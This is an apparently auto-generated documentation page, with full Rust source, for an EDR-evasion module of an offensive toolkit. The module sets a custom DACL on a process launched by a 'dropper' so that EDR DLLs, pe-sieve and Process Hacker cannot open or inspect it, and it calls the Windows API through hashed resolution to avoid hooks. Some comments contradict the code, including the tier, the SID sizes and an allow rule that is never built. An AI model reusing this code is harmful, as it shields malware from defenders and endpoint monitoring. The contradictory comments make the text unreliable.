# crowd — block_handle.rs  (🅱️ B TIER — SDDL-based handle protection utility)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/block_handle.rs` |
| **Lines** | 150 |
| **Tier** | S |
| **Cards** | T009-edr-evasion |
| **Role** | Block external handle access |
| **Unsafe blocks** | 2 |

## Purpose

# crowd — block_handle.rs  (🅱️ B TIER — SDDL-based handle protection utility)

## BlockHandle SDDL — bloquear handles externos al proceso target

Modifica el Security Descriptor del proceso target para denegar
`PROCESS_ALL_ACCESS` a cualquier SID que no sea SYSTEM + el owner.

Resultado: Process Hacker, pe-sieve, DLLs de EDR y cualquier herramienta
que intente `OpenProcess(target_pid)` recibe `ACCESS_DENIED`.

### Técnica
1. `NtSetSecurityObject` con DACL personalizada:
- Deny ALL para Everyone (S-1-1-0)
- Allow ALL para SYSTEM (S-1-5-18)
- Allow ALL para el dropper (current user implicit)
2. Aplicado al handle del proceso hijo (`DACL_SECURITY_INFORMATION`).

### OPSEC
- Sin llamadas a Win32 SetKernelObjectSecurity (hook surface alta)
- Usa NtSetSecurityObject directamente
- También bloquea VISTA de Process Hacker (ring3)

### Limitaciones
- No bloquea PPL (Protected Process Light) ni kernel drivers
- No bloquea ETW-TI (kernel)
- Solo ring3 — suficiente para bloquear pe-sieve y EDR DLL injection

## Constants

- `DACL_SECURITY_INFORMATION`: `u32` = `0x4`
- `PROCESS_ALL_ACCESS`: `u32` = `0x1FFFFF`
- `ACCESS_ALLOWED_ACE_TYPE`: `u8` = `0x00`
- `ACCESS_DENIED_ACE_TYPE`: `u8` = `0x01`
- `ACE_INHERIT_ALL`: `u8` = `0x0F`

## Public API

### `block_external_handles` (line 40)
```rust
pub fn block_external_handles(h_process: usize) -> Result<()>
```
Aplica DACL al proceso `h_process` que bloquea todos los accesos externos.
`h_process` debe ser PROCESS_ALL_ACCESS y apuntar al proceso target.

## Internal Functions

- `inner_block` (unsafe) (line 44)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd — block_handle.rs  (🅱️ B TIER — SDDL-based handle protection utility)
//!
//! ## BlockHandle SDDL — bloquear handles externos al proceso target
//!
//! Modifica el Security Descriptor del proceso target para denegar
//! `PROCESS_ALL_ACCESS` a cualquier SID que no sea SYSTEM + el owner.
//!
//! Resultado: Process Hacker, pe-sieve, DLLs de EDR y cualquier herramienta
//! que intente `OpenProcess(target_pid)` recibe `ACCESS_DENIED`.
//!
//! ### Técnica
//! 1. `NtSetSecurityObject` con DACL personalizada:
//!    - Deny ALL para Everyone (S-1-1-0)
//!    - Allow ALL para SYSTEM (S-1-5-18)
//!    - Allow ALL para el dropper (current user implicit)
//! 2. Aplicado al handle del proceso hijo (`DACL_SECURITY_INFORMATION`).
//!
//! ### OPSEC
//! - Sin llamadas a Win32 SetKernelObjectSecurity (hook surface alta)
//! - Usa NtSetSecurityObject directamente
//! - También bloquea VISTA de Process Hacker (ring3)
//!
//! ### Limitaciones
//! - No bloquea PPL (Protected Process Light) ni kernel drivers
//! - No bloquea ETW-TI (kernel)
//! - Solo ring3 — suficiente para bloquear pe-sieve y EDR DLL injection

#![allow(dead_code)]

use anyhow::{anyhow, Result};

const DACL_SECURITY_INFORMATION: u32 = 0x4;
const PROCESS_ALL_ACCESS:        u32 = 0x1FFFFF;
const ACCESS_ALLOWED_ACE_TYPE:   u8  = 0x00;
const ACCESS_DENIED_ACE_TYPE:    u8  = 0x01;
const ACE_INHERIT_ALL:           u8  = 0x0F;

/// Aplica DACL al proceso `h_process` que bloquea todos los accesos externos.
/// `h_process` debe ser PROCESS_ALL_ACCESS y apuntar al proceso target.
pub fn block_external_handles(h_process: usize) -> Result<()> {
    unsafe { inner_block(h_process) }
}

unsafe fn inner_block(h_process: usize) -> Result<()> {
    // ── Construir SECURITY_DESCRIPTOR + DACL en buffer manual ─────────────────
    //
    // Layout en el buffer:
    //   [0]  SECURITY_DESCRIPTOR (20 bytes en x64 self-relative = 0x14)
    //   [20] ACL header (8 bytes)
    //   [28] DENY ACE  (Everyone)    = ACE_HEADER(4) + ACCESS_MASK(4) + SID_Everyone(8) = 16 bytes
    //   [44] ALLOW ACE (SYSTEM)      = ACE_HEADER(4) + ACCESS_MASK(4) + SID_System(12) = 20 bytes
    //
    // Total: ~64 bytes

    let mut buf = vec![0u8; 256];
    let base = buf.as_mut_ptr();

    // ── SECURITY_DESCRIPTOR (self-relative, revision 1) ───────────────────────
    // Revision
    *base.add(0) = 1u8;  // Revision
    // Sbz1
    *base.add(1) = 0u8;
    // Control: SE_DACL_PRESENT(0x0004) | SE_SELF_RELATIVE(0x8000)
    *(base.add(2) as *mut u16) = 0x8004u16.to_le();
    // Owner offset (0 = no owner SID stored)
    *(base.add(4) as *mut u32) = 0;
    // Group offset
    *(base.add(8) as *mut u32) = 0;
    // Sacl offset
    *(base.add(12) as *mut u32) = 0;
    // Dacl offset — right after SECURITY_DESCRIPTOR (20 bytes)
    let dacl_offset: u32 = 20;
    *(base.add(16) as *mut u32) = dacl_offset.to_le();

    let dacl_base = base.add(dacl_offset as usize);

    // ── Build ACEs ────────────────────────────────────────────────────────────
    // Well-known SIDs:
    // Everyone:      S-1-1-0   = {1,1, 0,0,0,0,0,1, 0,0,0,0}   (12 bytes)
    // SYSTEM:        S-1-5-18  = {1,1, 0,0,0,0,0,5, 18,0,0,0}  (12 bytes)

    // ACE 1: DENY Everyone PROCESS_ALL_ACCESS
    // SID S-1-1-0: Revision(1)+SubAuthCount(1)+IdentAuth(6)+SubAuth(4) = 12 bytes
    // ACE total: header(4) + mask(4) + sid(12) = 20 bytes
    let ace1_offset = 8usize; // after ACL header
    let ace1_base = dacl_base.add(ace1_offset);
    *ace1_base.add(0) = ACCESS_DENIED_ACE_TYPE;  // Type
    *ace1_base.add(1) = 0x00;                    // Flags
    *(ace1_base.add(2) as *mut u16) = 20u16.to_le(); // Size = header(4)+mask(4)+sid(12)
    *(ace1_base.add(4) as *mut u32) = PROCESS_ALL_ACCESS.to_le(); // Mask
    // SID: Everyone S-1-1-0
    let sid1_base = ace1_base.add(8);
    *sid1_base.add(0) = 1;  // Revision
    *sid1_base.add(1) = 1;  // SubAuthorityCount
    *sid1_base.add(2) = 0;  // IdentifierAuthority[0..5] big-endian
    *sid1_base.add(3) = 0;
    *sid1_base.add(4) = 0;
    *sid1_base.add(5) = 0;
    *sid1_base.add(6) = 0;
    *sid1_base.add(7) = 1;  // SECURITY_WORLD_SID_AUTHORITY = 1
    *(sid1_base.add(8) as *mut u32) = 0u32.to_le(); // SubAuthority[0] = 0

    // ACE 2: ALLOW SYSTEM PROCESS_ALL_ACCESS
    // SID S-1-5-18: same layout = 12 bytes. ACE total = 20 bytes
    let ace2_offset = ace1_offset + 20; // previous ACE is 20 bytes
    let ace2_base = dacl_base.add(ace2_offset);
    *ace2_base.add(0) = ACCESS_ALLOWED_ACE_TYPE;
    *ace2_base.add(1) = 0x00;
    *(ace2_base.add(2) as *mut u16) = 20u16.to_le(); // header(4)+mask(4)+sid(12)
    *(ace2_base.add(4) as *mut u32) = PROCESS_ALL_ACCESS.to_le();
    // SID: SYSTEM S-1-5-18
    let sid2_base = ace2_base.add(8);
    *sid2_base.add(0) = 1;  // Revision
    *sid2_base.add(1) = 1;  // SubAuthorityCount
    *sid2_base.add(2) = 0;
    *sid2_base.add(3) = 0;
    *sid2_base.add(4) = 0;
    *sid2_base.add(5) = 0;
    *sid2_base.add(6) = 0;
    *sid2_base.add(7) = 5;  // SECURITY_NT_AUTHORITY = 5
    *(sid2_base.add(8) as *mut u32) = 18u32.to_le(); // SECURITY_LOCAL_SYSTEM_RID = 18

    let total_ace_size = 20 + 20; // 40 (two 20-byte ACEs)

    // ── ACL header ────────────────────────────────────────────────────────────
    *dacl_base.add(0) = 2u8;  // AclRevision (ACL_REVISION)
    *dacl_base.add(1) = 0u8;  // Sbz1
    *(dacl_base.add(2) as *mut u16) = (8 + total_ace_size as u16).to_le(); // AclSize
    *(dacl_base.add(4) as *mut u16) = 2u16.to_le(); // AceCount
    *(dacl_base.add(6) as *mut u16) = 0u16.to_le(); // Sbz2

    let _sd_total_size = dacl_offset as usize + 8 + total_ace_size;

    // ── NtSetSecurityObject ────────────────────────────────────────────────────
    let status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtSetSecurityObject"),
        3,
        &[
            h_process,
            DACL_SECURITY_INFORMATION as usize,
            buf.as_mut_ptr() as usize,
        ],
    );

    if status != 0 {
        Err(anyhow!("NtSetSecurityObject failed: 0x{:x} (may require SeSecurityPrivilege)", status as u32))
    } else {
        Ok(())
    }
}

```